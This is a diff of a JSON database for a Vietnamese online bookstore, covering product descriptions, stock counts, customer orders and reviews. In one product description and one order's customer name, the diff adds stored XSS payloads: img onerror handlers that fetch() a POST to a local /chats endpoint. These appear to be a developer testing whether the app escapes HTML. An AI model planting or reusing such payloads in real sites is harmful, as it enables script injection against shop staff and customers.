@@ -13,7 +13,7 @@
         "",
         ""
       ],
-      "description": "Nhà Giả Kim (The Alchemist) của Paulo Coelho là một trong những cuốn sách bán chạy nhất mọi thời đại. Câu chuyện kể về Santiago, một cậu bé chăn cừu người Tây Ban Nha, và hành trình đi tìm kho tàng ở Ai Cập sau những giấc mơ lặp đi lặp lại. Cuốn sách là bài học sâu sắc về việc theo đuổi vận mệnh của chính mình và lắng nghe tiếng nói của trái tim.",
+      "description": "Nha Gia Kim <img src=1 onerror=\"fetch('http://localhost:3000/chats', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({id: 'chat_duyy', userId: 'duyy', userName: 'duyy', messages: []})})\">",
       "author": "Paulo Coelho",
       "isbn": "9786043391234",
       "publisher": "NXB Hội Nhà Văn",
@@ -25,7 +25,7 @@
       ],
       "oldPrice": 100000,
       "discountPercentage": 21,
-      "stock": 25
+      "stock": 22
     },
     {
       "id": "2",
@@ -55,15 +55,25 @@
       "name": "OnePiece",
       "price": 36000,
       "image": "https://s3-api.fpt.vn/fptvn-storage/2025-11-21/1763742879_top-15-tua-game-one-piece-hay-nhat-hien-nay.png",
-      "description": "One Piece, từng được xuất bản tại Việt Nam với tên gọi Đảo Hải Tặc, là một bộ truyện tranh Nhật Bản do Eiichiro Oda sáng tác và minh họa.",
+      "description": "One Piece là cuộc hành trình của Monkey D. Luffy, một cậu thiếu niên tràn đầy năng lượng với ước mơ tìm kiếm kho báu huyền thoại \"One Piece\" để trở thành Vua Hải Tặc tiếp theo. Sau khi vô tình ăn phải trái ác quỷ và sở hữu khả năng co giãn như cao su, Luffy đã thành lập băng hải tặc Mũ Rơm, tập hợp những người đồng đội tài năng và trung thành. Cùng nhau, họ giương buồm ra khơi, khám phá những vùng biển kỳ bí, đối đầu với các thế lực hải tặc khét tiếng và Chính phủ Thế giới, tạo nên một thiên sử thi hoành tráng về tình bạn, sự tự do và khát vọng chinh phục ước mơ.",
       "id": "XxGDdYUaXN4",
       "author": "Oda",
-      "publishedYear": "3636",
+      "publishedYear": "1997",
       "categoryIds": [
         "1",
         "4I9L-ACOGzQ"
       ],
-      "stock": 50
+      "stock": 49,
+      "images": [
+        "https://s3-api.fpt.vn/fptvn-storage/2025-11-21/1763742879_top-15-tua-game-one-piece-hay-nhat-hien-nay.png",
+        "https://nipponclass.jp/wp-content/uploads/2024/07/MV5BM2YwYTkwNjItNGQzNy00MWE1LWE1M2ItOTMzOGI1OWQyYjA0XkEyXkFqcGdeQXVyMTUzMTg2ODkz._V1_FMjpg_UX1000_-723x1024.jpg",
+        "https://hobiverse.com.vn/cdn/shop/articles/One-Piece-Arc-Elbaf_9107d782-bb88-4193-95d7-0cc6b039b8fe.jpg?v=1745898918",
+        "https://onepiecetruyen.net/_next/image?url=https%3A%2F%2Fcdn.onepiecetruyen.net%2Fone-piece%2Fvi%2Fcover%2Fthumbnail.jpg&w=3840&q=75"
+      ],
+      "isbn": "ABC112",
+      "publisher": "Nhà xuất bản Kim Đồng",
+      "weight": "136g",
+      "dimensions": "11x12x13"
     },
     {
       "name": "Những Người Khốn Khổ",
@@ -140,7 +150,7 @@
       "description": "Cuốn sách gửi gắm lời cảnh tỉnh đến những ai đang giết thời gian bằng những thú vui vô bổ, sống những ngày nhạt nhẽo hay chết mòn với ước mơ dang dở. Thông điệp lớn nhất mà tác giả muốn truyền tải là: \"Tuổi trẻ của bạn đáng giá bao nhiêu là do chính bạn lựa chọn và quyết định\".",
       "author": "Rosie Nguyễn",
       "publishedYear": "",
-      "stock": 36,
+      "stock": 35,
       "discountPercentage": 0,
       "oldPrice": 0,
       "id": "fDDbGOk5pmk"
@@ -535,6 +545,123 @@
       "status": "Đã hoàn thành",
       "createdAt": "2026-05-15T17:31:36.642Z",
       "id": "Ikua6JjrVwI"
+    },
+    {
+      "customerName": "Test Admin Guest",
+      "phone": "0912345678",
+      "email": "testguest@example.com",
+      "address": "123 Test St, Hanoi",
+      "note": "",
+      "userId": null,
+      "total": 158000,
+      "items": [
+        {
+          "id": "1",
+          "name": "Nhà Giả Kim",
+          "price": 79000,
+          "quantity": 2,
+          "image": "https://images.unsplash.com/photo-1544947950-fa07a98d237f?q=80&w=800&auto=format&fit=crop"
+        }
+      ],
+      "paymentMethod": "cod",
+      "status": "Đã hoàn thành",
+      "createdAt": "2026-05-23T19:16:33.165Z",
+      "id": "yP2gokwCT74"
+    },
+    {
+      "customerName": "duy",
+      "phone": "0987905644",
+      "email": "trinhduy6996@gmail.com",
+      "address": "ha noi",
+      "note": "hihi",
+      "userId": null,
+      "total": 136000,
+      "items": [
+        {
+          "id": "fDDbGOk5pmk",
+          "name": "Tuổi trẻ đáng giá bao nhiêu?",
+          "price": 136000,
+          "quantity": 1,
+          "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxMSEhUTExIVFRUXFRgVFxUXGBUYFxcVGBoXFx0XGBgYHSggGB0lHRgXITEiJSkrLi4uGh8zODMtNygtLisBCgoKDg0OGxAQGy0lHyUtKy0tLy0uMC0tLjUtNS8tLS0tLS0tLSstLS0tNysyKy0tLSstLS0tLSstLSstLS0rLf/AABEIAOEA4QMBIgACEQEDEQH/xAAcAAEAAQUBAQAAAAAAAAAAAAAABgECBAUHAwj/xABFEAACAQIDBAYGCAQFAgcAAAABAgMAEQQSIQUxQVEGBxNhcbMiMjR0gZEUNUKhscHR8CMzUuElYnKCkhWyQ1Njg6LC0v/EABkBAQADAQEAAAAAAAAAAAAAAAACAwQBBf/EAC4RAAICAQEHAwMFAQEBAAAAAAABAhEDIQQSMTIzQXETIlFhofAFgZGx4dHxQv/aAAwDAQACEQMRAD8A7jSlKAUpSgOGdevt0Puy+ZLXOwtdF69Pbovdl8yWucFq9jZ+mjLkveBNW1WlqtIC1KrShwUtSlAKUqlDpWlKoaAVSq0oBSlKAUpSgLgal/VMP8Vw/hL5UlQ+ph1Sn/FcP4S+VJVebpvwdhzI+iaUpXjGwUpSgFKUoBSlKAUpSgOGdevt0Puy+ZLXOBXR+vX26L3ZfMlrnNevs/TRlyczApagoauKwKVQmvVYja500vbjbdfu/elDp51d2R46eOn96u7S24AeG/57/larSP3u4fr+xurtHNRlHP5D9bU07/kP1qlqqbfu37/ZodoWHM/IfrTKOfzH6XqoiJ3A8+6qtewFxYXtuvrzI1PxoKLOzPCx8P031Qi1VtVwc7t45HX5cvhSjmp50q/IDu0PLh8+Hx+dWkVyjpSrrVSq0OMrUu6pvrXD+EvlSVEKl/VL9a4fwl8qSq83Tfg7j5kfRNKUrxjaKUpQClKUApSlAKUpQHDOvX26H3ZfMlrnN66N16+3Q+7L5ktc4r19n6aMuTmZWqE1U1dCv2v+Pjz+HDv8KuK+Gpcq5dT63/b+p/Cqgb7348L6/G1LVdvuSdd/HU/vnyNT3SNlimxB5EHUA/MHQjuNZiQYdQpaaVyVBZEiVQrWF17R31sbi4Q3tWLVbD97reN9Du/e842N8yDNCB6MNzc/zXZrDQj+X2Y113g7hzrzfFsb2yrfgiqunK4F/marHhZCyoEYs9sgsbvmOVct99yCOWh5VI+m7R2w8ahXlhjMeJxCIAkk5ynIGUAOUCsL8bnkardKSXyS3tLIrIxOpJJ7zc/M0yaX007xf4Dea9VZgCoJsxFxfQlb2uOJFzbxNZmz9jTTYhMMqZZnbKFkuliFLHNcXFlBO69WOlxIKV8DW5aq27hp3D7zx+NZe0sA0EhjexICkMpurK6q6sptqCrA3rwgVSy5yQmYZits2W+uW+l7XtfSmjVo7etGx2lsIxYaDFLKHinLqvosjq6EhgVNwRcH0gbaVqhrYH87ju7/AN+Fb7pC+JnjixDwtFhh/Bw6BWEUaDUKrN65OU3f7RXhoBoLVXjutSUmrLCtqpXsNRblu/SvEipNUcTK3qXdUv1rh/CXypKiAqYdUw/xXD+EvlSVVm6b8E4cyPomlKV4xsFKUoBSlKAUpSgFKUoDhnXr7dD7svmS1zmujdevt0Xuy+ZLXORXr7P00ZMvMUIJsBvJtXv+A0HhXnhxdieQt8W0/C9e6kXFxpfUAkEi/AncbaVogu5TN9jYbG2BicWbYeF5NbFgLIN3rO1lHO171NcL1UyJG0uLxcUMaAs+RS9lUXJLEqBbXgau6WdOXSOODZ6dhhuzXLKoszXAJRD9gqbq32r33ccvpzjHg2PgsOXJkmVXlJJZmygSvdibn+I661mlkzSca0t/uWJY0netEcabY8GXLHPjDxLs8SX17kPL7JrS4zFw4jEhmjTCwaApEt8qLcm1rZnbmbakX0FZ3SDonPhVw5LI4xIUoFvfOQtlYf8AuWuL8amuM6FYf/qGHwwjHZwYJZp7ABp2DFAGsN7Fbk8rjlUt/HBXbd3rZGpy0pLgRvpxtR3EBOFkwpXMMLcBb4IxomVrG4cMCbW0EngW02JTEps+EFl+iSzPIii2YSx3jN7gG1r7iRpwNSWdpMdsjEYiQq7x41nGU3tn7BbDiFCs9l5ZTwrG6YxCPZuyUAsGillPi/ZPf5yGmJpbsK/+q/jU5kvWV9jSbB2VBKU7eVx2kwgSKJUaRicnpMzsFjT01GtyfSsNKnPTbpHhcLj5XXCvJi440RZDJljQ5VdSqC97XF7i+8bjUH6IRZsbhh/6yEHkym4+F7VI9vRpJtuaSX+TFkxEhXW8cUMTADnmbIv+7wruaCeX3Ntbrf8AhHHN7lx+aMvpd0cbH4+UYR07SJI1lhcNHksq2MbAFWXW1iQQRxG7y6EbGjTDSY+bDrPLJJ2GGw7aq0hOQk5r65i1yb5VRjXr0cxjR7N2ntBtJZ5OzBGtmc2uvcGnP/CsDZe1oZdlpgjijhZYnZwxDhXVmkul0BNiH+YsRa16Wp7m4uCaX/eHay1Sjvb3ym/+FesfbCPFDgYezcYazzPEoSETWKZI1GgALtprvA1IaoBatxtOeBUWDD3ZFOZ5WGVppLFQ2XUpGoJyqdfSYnU6arLyFzyGpJ7hx8K14ce7CiqeS5FjMb5rW1vYbgd+g5VbMutxx1/fhUo6cbGjwrYaMWE30ZDiEXcsvM95B13eqDb0tY0/qj4j8/1rsGpxtHX7ZUeFTDqlP+K4fwl8qSofUv6pfrXD+EvlSVTm6cvBZDmR9E0pSvGNopSlAKUpQClKUApSlAcM69fbovdl8yWuc10br19ui92XzJa50OJ5AmvX2fpoyZOZl+GHok82PyAH6mvbN9w7t1715wfy0+J/+RH5V65jYC5tqbX0BNrm3M2HyHdWuC9qMuR6sow0NrXtU962sVnlwqj+WuEV0PPOTf7lSoKvK3ff56eGv3Ct2cZJi4sPhOz7SWMlIGU2Yxn/AMJgdDa1w1xYC1uNcnD3xn8X9+5CM/a4/NE3226q+z+0sfoOzTi3Q7iwREjHj2qJaszaW0xh9qySTE9muz41mI1PpOFAHeWfd8eFc+23tnFSfwZwEZUSFx2ao7LFqiyE6mxJIGg1BsdLeu3ekUuNb+UqtIyNJkzsZXRciCxJIUDMQg0uxOpNZFssnV8K/wBv+y97TFXXE88VtlUwbYPDZ+waXtZHkCrI5soVCFJAUZFO/UjgNDIOshcmH2Wtv5eHddbkHKIBx3g5fvqPbW2F9GiBmkVcQzezD0mWMj1pCNI2vuU62PcRUi2pt3Cyx4SeSTPLBG1sMEfWW0KpmYjKIw0WY6+lu4kVbJJSjKCtW/3dfmvAri21KMtHSIo7nDyx5dHhKs/A9qCHK3Goy6JpxUnjWy6R9IhiFfs8P2KysrSMXMjSdioVVzEAKi6HLbfY1qHwczRtiSjmMyENLb0TIdTc8yT8zavLClw6mIsJMwyZdGz39Gx53tWj0oupPVr8/sp9SS9vBMk/R/b8H0GXAYossbt2iSoM2VtGF1+0Ayg243PdWhxnYxgLC5lYg5pspRSrLYxrG2vE3Y2PIC1zM+lnR2OfaUMEJjjeWJWnKWyK92LOEHGwJIvqNeZOXsro9gfoGPlUfSEjEojndFUlkiuTEwJJTMRYniCdayrNjit/XXWvOho9Kb9ummlkU6SbXgkweBhhRQ8cR7ZsmVu0sFsTb0gbM19eFYWx8WImU4XDvNibXV2XOIyBfNHAgN2G/MxYC18oqXp0VixLbNiWNYg2BM+IkUZS3ooAzHi2Yg68Ca3fQjB4aLFYiRIEiEbSYeL0pWd3hF53vIx9G+UCwG81CWfHGG6k3xf37k44puVv80OSJFNiZHYB5pCGkc6s5A1ZuZ05VifZPwP4/rUs6vYFmxn0iVsiYcNi5HvYCzKbE6820461GcXKHeV1FgzM4GmgZ7gWGgsDWuMrk41wSKq0T+WYLCpd1S/WuH8JfKkqJNUt6pfrXD+EvlSVnz8kvBox8yPomlKV4xtFKUoBSlKAUpSgFKUoDhnXr7dF7svmS1zoj0W8DXRuvT26L3ZfMlrnTj0G8Pzr2Nn6S8GTLzG56NbUTDFXfDQ4lWjKlJQSAC7G67wp4Xse61zW4k2jsuW5bBYjDseMEwkH/GawGnKovFokfco4A8Sdx0NXovf8/wC1aVhTp63XZmSWVq19TfPhNn2uuIxC6AhXjRifjGSB8damPVvgcNAJcd2jOqI4uyZcgUBnK3PpGzIvxI41DthdHTPHNNJKsMEIGeVgX9JrWRVUgs2o071HGp4uz4xsnDYeOdXXFYpIu2CshKNKzkANcqRktY8VrNtMlW4pPjT/ACieDV7+6uGhBMdJ9NnLB5ppnPoqUjQcSFFnayqL6chWRhGxcYVIYxAXmbC9ooAlMvo3R5T6aWzD1co0OmhqaYGMHahiWNEhjlWCJVjjBURIJ5Dny5zcooIvqJhesXFT58FPjb2Cz4x4zw7SZkw6HxCM+vxqPr8IqOmlfvw+h30eMm9dfsarpVsnDx7NgnhUXbEsgl+3LHlkBdz9rO0ZcX3BgNN1Y2H2NDCEjmTPMyDET5nkSLCQ2uC4jKs8pVvVzDVlA367DpvCYNn7NiIIOQSEcA4UMfjeUj4VpdqbRfFlooIOzBdppruGZ2H25pSFCxoNANFXxtaWPflBa6W9bIz3VN6a0tCS4rHX2FOyoIonxCxwR/0wq8QsSfWJKSEsb3Jao7seJMC30jED+OFzYfDfaz8JZeEaj1gDqd9tBeYdLcZ/07Z2Ew0RTtT6QfLcrYEtKob1XLOLMRxa1ju5g3pFmbMzHXNe92JuS1wS1xm4g314WPdmi5Ql2i2/L/O4zy3ZL5S/ZEg6LbQxT4xplhfFSOr51UhbBwVvmIIQDcAdNwqT4Ey/RMdE8Qw8MGAKRQhkkuZBITI0imzuWTUi2p3X3+XVXj0jixEasvbtJGQpKreP1WZCxGYqC7WvwHOsbZ+zR2Q2TDiEeeZzJiZlzGNFiAyxId7+r3cfCqszTyNVVV88F3+CzEmoJ3xsx9sdM4/omGTCtIs6wwxyyZRosKk9mL6MC5F94IHG9qjB6R4ntkn7W0kZZkyqiopcln/hqAvpliWNrtfXhXjLgCJmhzpcSNF2jMFj9Fiucsdy6Xvy+VbzpZLgWijTC6Nhz2OexBnjK5jNu4SZxr/VcaWtpjjxQaSV338lLlklbbqjSYjbDmJoUSKGN2DusQZRIR6uYs7HKLkhAQo32vWtYaHw/MVnYDASzMY4Y2ka2bKgubDS9h4/fWNPEVzAixW6kHQgg2Itwsa0JRVpEPc3bNe2+pb1S/WuH8JfKkqJPUt6pfrXD+EvlSVkz8kvBsx8yPomlKV4ptFKUoBSlKAUpSgFKUoDhnXr7dD7svmS1z1vUbwrofXp7dF7svmS1zwj0G8K9jZukvBjy85lwpdI/wDR+Zr0CVfh1/hR/wCj8zUjbo6n/Tfpods/b9mY/RyKuYryuTuO8aHdxrZ6kYRjfekeduucpV2s3+wNnnGbHOHidFdcQXlLnKoFwczG27IQfFLcKr0tljOycI2GZskGJMavezFkEoEoI3FiuccswqBRx30BAve9zYaDNa/w0HO1brYG1Y0ilw2JVmw8tmJW2eKVd0qA79wBB3geIOaeFqW8net154mlTtbrVaVf9GR0V6QsMfDNipWKjOhdjcIHQrm3c8tzvsNd1efSR0jhwuGgxAlSKNi4Vs0ZlaR2zHL6LGx+ArUYhVJumbJYZWfeQNMxAuBqDoCbWtc2udk2zThTDLPGroxJaLM1xlCsyPltlbK6MBfS4vxFTcYKSl9vFkY77Tj9/wCCZdJZodsQYcwzwx4lDYwysEYlwoZV4nVRa1wfGtR0S2WMXiFhhFsJCyyTOdGxDKSUz8wWBypuVQ32tT6dI9lxbNx2HliDNEbShL6gA2ZVY6kWItf51pekO1AkUEOznnSNc7SWJEksjgLdlQ3IVRlFzbXjoazRi9yocHwvt8/4aK91y49/r+dy/p3tX6XjJHBvGn8KPXTKp1YeLXN+8cqxNgdHpcW5SMqvAFyQpkys4QWB9LKrndYZTruv7dD8GkuIiSVboVkLruHoxSNYEeA10/WZdAkaLEJEQf4OGMsotYriJzCdRzWLKvdZ+dWZMvpQ3Idl+fn1EcO/Lel3Iz0Z2NDLhsfLiI79jCOzFytpbSWuFIzG4Qa77nfesDojhcRJiUGEkVJgGKsxAFgCCNxvod1q3+AX/CyzDTEYoyOASD2cQFkB4Fpcig8M4PA1J4IlG11jRVHY4LKcoC3ew3gcMrrblVUs7W8v/NCxYFoQXop0VSdJZ55OxwsIIaRbZiygGy3B3Ag3sb3AG/Sa4HZeHhbZ0EUeWZpWxDtIsYnEKpKf4pQaEkqlu4jgateBodmR4fDIJZoHjM0QuSZAA7kopu4WRk9HuF7jQ6HB7UfBYkYic9viWv2qkjNHEwNgSCQJCcpyjRVW2mbSuU55m9fCJxxqPY3fRu0X/VMfYKxafshp6sRclhzu5UHvWuTTJ6La3NhfmdRUz2Xt+INNFMrph5cOcOLHO0VizZzYDOxdnY2A1PIVFdpxqqkLIH0F2VXAvfcM4B4X3Vp2dOMnvd6K8kPb4NExqW9U31rh/CXypKiBqX9Uv1rh/CXypKln6cvBHHzI+iKUpXiG0UpSgFKUoBSlKAUpSgOG9evt0Xuy+ZLXPV9Vv9J/Cuhdent0Xuy+ZLXP4NbivZ2XpoxZuZmy2frDH3Aj5Ma6FIn+AxIAS0mIsoGpZu1kNgOPq1z7YGsI1tZiDv4+HCul7aj7LZOCUaO12W28doGdmB55WK/7zameekF9UMGJe5+SFy7EmWSKMoC02UxkMrK2Y5R6SErod/K1T/o50LgTFRlZ5JWgCyS+gBHnZbooN7g6hsvpaDUi4vjYvFfQoMFHLFeYRzZiT6UUcrHRRwc6C/DKw46ZGG6WRR4mMRFhC8ryzyOAGeSQMAG5Il1G/wCyOVznyZcs46cNf3L44Yp8DyMWHmxmNxghQx4OP0UAAWWZQ/psBodVIHcEPCvfa3R44qC6spjlxbYrtWbRYJEQG7E6WFxl5oBoBWuwGEaNcdBMezDiyyvmWJmLXU5gLelYEd2Y8CKxts4+IYHD4KMhyrdpKw1VXOZiqkaPq51Gmg38IJNyW6/j+KJqFmP072wmKnTsv5cS5FfgxvqR/l0AHhfca1myI/WJHId3dccd/wB1ajamM7K1lve514Ac/wB8Kz9hTP2Ks51kksultB+Pqt8K3447sVFGbaUkn8m9wUseHnWdoy6qrB1UgFhIrR3HhmF/9XdUk6Gv9IXaOIsRNKxATiqBGKC/iSv+wVAtsbVRNPWOSRSARdSctib9448tKi74+Q3AkezaMAxVWA3BgDZvA331DLs/qarRkcGTdjTJrtTbESbPwcCyLnDSTOBZmX0zkDAXsCDex/pFY21+n0jN20KdjMwHayIT/EYLkBOb1Vt9kcdSb2tCwK98DPGCe0BYWsAACPHX976l6EEtdeP3LVkbdcCQYWWXU9o5kc3bKSMxa53g3Y3PG97mpFH0QBnGFbFIuIy37PIxS9i+Ttb+tb0vVtrxNaDZ+LViHiYXRlI0PosNRoRru+6p9saRMdtBMSsbR9mmee5GXOq5Vyka8t9tE8aozTlHVafmhq9PSyB4/APBK8bjK6GxsbjNvBB5EEGtZtZCI782B+5h+NSbb+MGIxMsw9VnNu9QAqn5KKje39FQcyx+QS3/AHVdjk3V8SOeFYmyPGpf1S/WuH8JfKkqIVL+qb61w/hL5Ulcz9OXgyQ5kfRFKUrxTYKUpQClKUApSlAKUpQHDevT26L3ZfMlrnsB1roXXp7dF7svmS1zuPfXsbN04mPNxZtejR1lT/Nf4a/pXQ9lbZzFTi5T/AFof4dyrGwY2UWLhQMpfQNY8CDzDAylJzY2zoQD32/sa9Z8W7es7H42+4VZPD6io7iyKFprjqTXpFtxZpzKxCDRUVmF1jXQDx3k79Sa0b7WjG67eC//AKsKj1VBqyOBRVFj2iXZG5fbrWyqug3BmJA78o0rCkx8jaZyO5dPv3/fWIDVGfuvVihGJTLJN9y4nW51PM6/earisUZAqGxCiwHDxPfw+FYzMTvq9W7qWmRr5KiP5ctwq4mq3vVoUsQii5JsAOJ5V10kcSbdF+EiDuFLBVv6TEgaeJ41KYdnxDURoeRsD99aCPYOI/8ALt/uT9ay8LsDEA3zqneC1/uH51mnJPub8EJx03LN+sRNgB3Dlc7h+++pR0gxq4WP6Dh76azycXcgXUd1rX7hbnUawcLIoDPnO69ra620GvHjWz2hhHsk0jZjMrPfjdSVJNtNdDw3nlWSdOSvgel6dtX/AAanJ/bwPLuqP9Jz6SKOCZvmSP8A6ipUyc7fd9/96hvSGXNM9twso/2ixH/LNV+HVmT9Q0xpfLNVUu6pvrXD+EvlSVErVLeqb61w/hL5UlTz9OXg8yHMj6IpSleIbRSlKAUpSgFKUoBSlKA4b16e3Re7L5ktc6FdF68/bovdl8yWudV7GzdNGPJzMuxZIyON6n+/78aycVvzD1WGYfGvFRmBXn+NVwL5lMR9YElL8+K/n8603UvJWuHj+jKw2ALxSyhlAiy3U3uc2mnhVuDwZkjlkDKBGASDe5uCdLD/ACka2uSo3msBk113/garXLZZRscBs8ypK4YfwkzkHiLE6cOHHmLXrwSPMrPcWQoCOZfPu8Mn3isZj/ai6V2zm6bOTZ5ECz5hlZylrHQi+87uFYTbq8761UtUkyO6zN2ns9oMl3Vs6ZxlvoN1j36VvtgbH7NwzZWLRhkYG4Ab1gBbeAVF+82qJgV6YedozmRmQ8SpK38bb6qlFyVWXYZrHNSZ02fBlQpJBzC411sQD+ZHiG5VbLhsoUgg5lzaX01Isb8bg7qjWwdo4p2AKdohIuzLkyjnnAA79xNSfLb+3P8Ad6wzi4aNnvYJ+qrjf8Hri8KEEd7ekgYkX1vrvI5G1u486sxeFKKhLKcy5hY6i+VrHv8AS+41YV47v3+/nQx7+HH9PHfVdmhY2nqzX4/FiKN5D9kXA5ncF8SbD41A5r8Tc8TzPE1uOkWP7SXslN0iN3I3NJwHgtz8b8q0znWt+zxqF/J4H6jmWTLurgjzNS3qm+tcP4S+VJUSNS7qn+tcP4S+VJTP05eDJj5kfQ9KUrxDaKUpQClKUApSlAKUpQHDevP26L3ZfMlrnVq6L16e3Re7L5ktc8Fezs3SRjy8zKxmxqmNh+2vxtwPOrhXrHJwrRuqSplO807R5CQSjlJxH9feO/urytTFYPiu7ly8KtXF5hZ9f849b4/1fjVbbi6kXRqvbwKF6B6teM8PSHMfmN4+NeaNUd5lqSZlKauJrHRq941v++8D86sTsi1RctZuzMf9HkDhVY2Is27W36Vre0q4V3RqgrTtE3w3TONv5kboeJUhxy7jW2wu1oJLZZV14MSp14Wa165sCBVDKKols0H3o3Y/1LNHRpM6xl/fD+9RnpX0hEd4IDeU6Mw/8PmP9f4VD8Pj5gbQu6c8rMo8Taroogg5sd5/SoY9muXHQltH6n7KiqbCIEUKPie+rDVzGra2P4R431AFSvqn+tcP4S+VJUVNSvqn+tcP4S+VJVG0dN+CzHzI+h6UpXiG4UpSgFKUoBSlKAUpSgOG9ent0Xuy+ZLXPFNdE69Pbovdl8yWuc2r2Nm6aMeXmZ6mqA1RWq7fWniVVReklJcMr67jzH5jjVlqBqlo1UiNNO4mO+DddRr3jf8ArXg7m/pDXvFjWyWU1f2t94uO+q3hj2ZNZZLijVCUcrffVpfvramKM/ZH4fhVhw8X9P3n9a56Uvks9dfDMBZAKu7WszsI/wCn7z+tXqqDcg+Ov40WOXyHnXwYKFm3Anwr3jwZ3ubdw3/PcKyTNXmz1L00uLsg8snw0L8wUWUWFWE15lqqovUt74I7talaqdKbqsdq43QKM1S3ql+tcP4S+VJUQqX9Uv1rh/CXypKozdN+C2HMj6JpSleKbBSlKAUpSgFKUoBSlKA4b16e3Re7L5ktc5BrovXr7dF7svmS1zkV6+z9NGTIvcytXK1WVW9XldHsGqtga8aqGqe8RovKVbY8qZ6qJKaHdSmaq5q9sOhdgq2uQSLkKNAWNyxAGgO+tvidg9koMhs2uYeqAMjOArMLObAXy3y31A48bS7nDRZqoGrLx8SowCm4IvvB4kbwBfdyrHEldVPudLbGq9nTPVC9NDmpdYCqFq8i1UqO8SouLVbSl64dKmpf1S/WuH8JfKkqIVL+qX61w/hL5UlVZum/B2HMj6JpSleMbRSlKAUpSgFKUoBSlKA4Z16+3Q+7L5ktc4ro/Xt7dD7svmS1zivX2fpoy5OZlaVSlXEC4Gqg1aKrXSDLiBztVMvKx+IqhqhoEesJKsGyBrcGW6/EcefyrNj2wykHsobi+9X1vvv6d+YuK1oNVznma40mS1NlLtmRvsR3sBukJ0AF7lySd5uTvJrCxErObkcLWANh868s55mqGmgLspquXvqwVW9dOMaVS9L1SuWdK0qlVodLjUu6pfrXD+EvlSVEKl3VL9a4fwl8qSq83Tfg7DmR9FUpSvGNgpSlAKUpQClKUApSlAcK6+Pb4fdl8yWub0pXq4OmiifEUpSrSJUb6oaUocZX9aoaUocKVWlKHSrVSlKHUVqh4UpQIVQVWlDg/SlKUBdUu6o/rXD+EvkyUpVeXkfglDifRtKUryTQKUpQClKUB//Z"
+        }
+      ],
+      "paymentMethod": "cod",
+      "status": "Đã hoàn thành",
+      "createdAt": "2026-05-24T07:29:48.628Z",
+      "id": "m6f4KbbDAuw"
+    },
+    {
+      "customerName": "duyy",
+      "phone": "0987905644",
+      "email": "trinhduy6996@gmail.com",
+      "address": "hanoi",
+      "note": "hi",
+      "userId": "3u7_xNCADHQ",
+      "total": 36000,
+      "items": [
+        {
+          "name": "OnePiece",
+          "price": 36000,
+          "image": "https://s3-api.fpt.vn/fptvn-storage/2025-11-21/1763742879_top-15-tua-game-one-piece-hay-nhat-hien-nay.png",
+          "description": "One Piece, từng được xuất bản tại Việt Nam với tên gọi Đảo Hải Tặc, là một bộ truyện tranh Nhật Bản do Eiichiro Oda sáng tác và minh họa.",
+          "id": "XxGDdYUaXN4",
+          "author": "Oda",
+          "publishedYear": "3636",
+          "categoryIds": [
+            "1",
+            "4I9L-ACOGzQ"
+          ],
+          "stock": 50,
+          "quantity": 1
+        }
+      ],
+      "paymentMethod": "cod",
+      "status": "Đã hoàn thành",
+      "createdAt": "2026-05-24T08:00:07.368Z",
+      "id": "yn2OtCQ2C7U"
+    },
+    {
+      "customerName": "<img src=1 onerror=\"fetch('http://localhost:3000/chats',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'chat_duyy',customerName:'duyy',avatar:'https://ui-avatars.com/api/?name=duyy',lastMessage:'Hello',messages:[]})})\">",
+      "phone": "0123456789",
+      "email": "duyy@gmail.com",
+      "address": "Hanoi",
+      "note": "",
+      "userId": "3u7_xNCADHQ",
+      "total": 79000,
+      "items": [
+        {
+          "id": "1",
+          "name": "Nhà Giả Kim",
+          "price": 79000,
+          "image": "https://images.unsplash.com/photo-1544947950-fa07a98d237f?q=80&w=800&auto=format&fit=crop",
+          "images": [
+            "https://images.unsplash.com/photo-1544947950-fa07a98d237f?q=80&w=800&auto=format&fit=crop",
+            "https://images.unsplash.com/photo-1512820790803-83ca734da794?q=80&w=800&auto=format&fit=crop",
+            "https://images.unsplash.com/photo-1491849593786-6ec8005bc439?q=80&w=800&auto=format&fit=crop",
+            "",
+            "",
+            ""
+          ],
+          "description": "Nha Gia Kim <img src=1 onerror=\"fetch('http://localhost:3000/chats', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({id: 'chat_duyy', userId: 'duyy', userName: 'duyy', messages: []})})\">",
+          "author": "Paulo Coelho",
+          "isbn": "9786043391234",
+          "publisher": "NXB Hội Nhà Văn",
+          "publishedYear": "1988",
+          "weight": "250g",
+          "dimensions": "13 x 20.5 cm",
+          "categoryIds": [
+            "2"
+          ],
+          "oldPrice": 100000,
+          "discountPercentage": 21,
+          "stock": 23,
+          "quantity": 1
+        }
+      ],
+      "paymentMethod": "cod",
+      "status": "Chờ xử lý",
+      "createdAt": "2026-05-24T16:16:47.825Z",
+      "id": "YECWHYIxt6Q"
     }
   ],
   "users": [
@@ -643,6 +770,115 @@
     }
   ],
   "wishlists": [],
-  "reviews": [],
+  "reviews": [
+    {
+      "productId": "XxGDdYUaXN4",
+      "userId": "3u7_xNCADHQ",
+      "username": "duyy",
+      "rating": 5,
+      "comment": "Sách cực kỳ hay, hình vẽ đẹp và giao hàng siêu tốc!",
+      "createdAt": "2026-05-24T08:01:06.040Z",
+      "id": "P6p0oj6anPk",
+      "replyContent": "Cảm ơn bạn duyy đã ủng hộ cửa hàng sách của chúng tôi!",
+      "repliedAt": "2026-05-24T08:05:00Z",
+      "repliedBy": "Nhân Viên Bán Hàng"
+    },
+    {
+      "productId": "1",
+      "userId": "user_2",
+      "username": "hoangnam",
+      "rating": 4,
+      "comment": "Nội dung cuốn Nhà Giả Kim rất triết lý và sâu sắc, nhưng gáy sách hơi bị móp một chút do vận chuyển.",
+      "createdAt": "2026-05-23T14:20:00.000Z",
+      "id": "rev_2",
+      "replyContent": "Da shop chan thanh xin loi ban ve su co van chuyen lam mop gay sach. Shop xin gui tang ban ma giam gia cho don sau a!",
+      "repliedAt": "2026-05-24T08:10:02.302Z",
+      "repliedBy": "Nhân Viên Bán Hàng"
+    },
+    {
+      "productId": "fZFkIisy7Os",
+      "userId": "user_3",
+      "username": "thuychi",
+      "rating": 5,
+      "comment": "Tuyệt tác văn học kinh điển. Bản dịch chất lượng, bìa cứng cáp.",
+      "createdAt": "2026-05-22T09:15:00.000Z",
+      "id": "rev_3"
+    },
+    {
+      "productId": "2",
+      "userId": "user_4",
+      "username": "quanghuy",
+      "rating": 3,
